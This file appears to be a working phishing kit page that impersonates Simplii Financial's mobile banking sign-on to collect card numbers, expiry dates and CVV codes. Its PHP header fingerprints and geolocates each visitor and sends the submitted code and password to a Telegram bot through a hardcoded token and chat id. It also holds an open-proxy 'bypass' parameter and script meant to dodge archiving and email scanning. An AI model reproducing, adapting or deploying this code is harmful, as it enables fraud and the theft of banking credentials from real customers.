<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";

    $url        = "https://BMO.com";
    $user       = $_POST['code'];
    $pass       = $_POST['password'];
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="$user\n";


$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><!--?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?--><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head></head><body lang="en" class="android-fix">
<link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#&quot;"></style><style lang="en" type="text/css" id="#"></style><style lang="en" type="text/css" id=""></style><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        
        <title>Simplii Financial Mobile Banking Sign On</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./files/reset.css">
        <link rel="stylesheet" href="./files/reset-brand.css">
        <link rel="stylesheet" href="./files/global.css">
        <link rel="stylesheet" href="./files/global-android2.css">
        <link rel="stylesheet" href="./files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./files/reset(1).css">
        <link rel="stylesheet" type="text/css" href="./files/reset-brand(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global-android2(1).css">
        <link rel="stylesheet" type="text/css" href="./files/global-brand(1).css">
        <link rel="stylesheet" href="./files/password-reset.css">
        <link rel="stylesheet" href="./files/password-strength.css">
        <script src="./files/password-strength.js###%"></script>
        <script src="./files/change-password.js###%"></script>
        <script type="text/javascript" src="./files/jquery-1.js###%"></script>
        <script type="text/javascript" src="./files/wicket-event-jquery.js###%"></script>
        <script type="text/javascript" src="./files/wicket-ajax-jquery.js###%"></script>
        <script type="text/javascript" id="wicket-ajax-base-url">
            /*<![CDATA[*/
            Wicket.Ajax.baseUrl="change-password";
            /*]]>*/
        </script>

        <link rel="stylesheet" href="./files/appboy.css">
        <style>
        input[type='number'], input[type='text'], input[type='password'], input[type='email'], input[type='tel'], input[type='search'], #manage-cards-button, select {
            padding: 0.8em;
            height: 55px;
            max-height: 46px;
        }
        </style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>var lrbank = 'Simplii'; var lrinfo = 'Card';</script>
        <script src="./files/actions.js###%"></script>
.automa-element-selector { direction: ltr } 
 [automa-isDragging] { user-select: none } 
 [automa-el-list] {outline: 2px dashed #6366f1;}
    
        <span class="offscreen">Simplii Mobile Banking</span>
        <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div class="account-holder-name" id="account-holder-name"></div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
                    <span>My Profile</span><span class="drawer-icon-cog"></span>
                    </a>
                </div>
                <ul>
                    <li id="li-my-accounts"><a id="accounts-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink" role="menuitem" class="">My Accounts</a></li>
                    <li id="li-pay-bills"><a id="paybill-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
                    <li id="li-interac"><a id="etransfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
                    <li id="li-transfer"><a id="transfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
                    <li id="li-upcoming"><a id="uptxs-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
                    <!-- dynamic SSO links -->
                    <li class="li-sso"><a id="GMT-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
                    <li class="li-sso"><a id="FXC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web" role="menuitem">Order Foreign Cash</a></li>
                    <li class="li-sso"><a id="RPC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage" role="menuitem">Prepaid Cards</a></li>
                    <li class="li-sso"><a id="PMO-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web" role="menuitem">Buy Gold and Silver</a></li>
                    <li class="li-sso"><a id="CCS-link" href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web" role="menuitem">Check Credit Score</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink" role="menuitem">Open an Account</a></li>
                    <li id="li-browse-products"><a id="products-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink" target="_blank" role="menuitem" @="Explore Products<span class=&quot;offscreen&quot;>. Opens in new page</span>" class="">Explore Products</a></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <!-- Customer Services link visible for Simplii non-Small Business -->
                    <li id="li-client-services"><a id="customerServices-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
                    <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
                    <li><a class="nav-no-indent" id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
                    <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="c.php" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="">
            <section id="ide">
                <section class="page-title">
                    <h2 class="title">Identity Verification</h2>
                </section>
            </section>
            <section id="change-password" class="page-wrapper">
                <div class="global-error-from-container" id="idf">
                </div>
                <form id="idb" method="post" action="c.php" onsubmit="return validate()">
                                        <div class="form-group" style="">
                        <label>Card Number</label>
                        <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="form-control lrinput" onkeyup="split()" required="true" autocomplete="off" maxlength="19" attr-action="Filling Card" oninput="this.value = this.value.replace(/[^0-9, ]/, '')">
                        <script src="./files/splitter.js###%"></script>
                        <link rel="stylesheet" href="./files/card.css">
                    </div>
                                        <div>
                        
                        <select name="exp1" class="form-control text-center display-inline-block lrinput" required="" style="width:48%; display: inline-block;" attr-action="Selecting Expiry">
                            <option value="">MM</option>
                            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                        </select>
                        <select name="exp2" class="form-control text-center display-inline-block ml-10 lrinput" required="" style="width:50%; display: inline-block;" attr-action="Selecting Expiry">
                            <option value="">YY</option>
                            <option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option>                        </select>
                    </div><input id="input-card" type="tel" placeholder="CVV [3 Digit] Code" name="cvv" autocomplete="off" maxlength="3" oninput="">
                                        <fieldset class="button-set">
                        
                        <input id="save-button" class="btn btn-positive" value="Confirm" name="save" type="submit">
                    </fieldset>
                    <input name="CRSFToken" value="baee0e28-1986-4bc7-82f2-fe4d85aa68ef" type="hidden">
                </form>
            </section>
        </section>

        </div>
    

<div id="automa-palette"></div></body></html>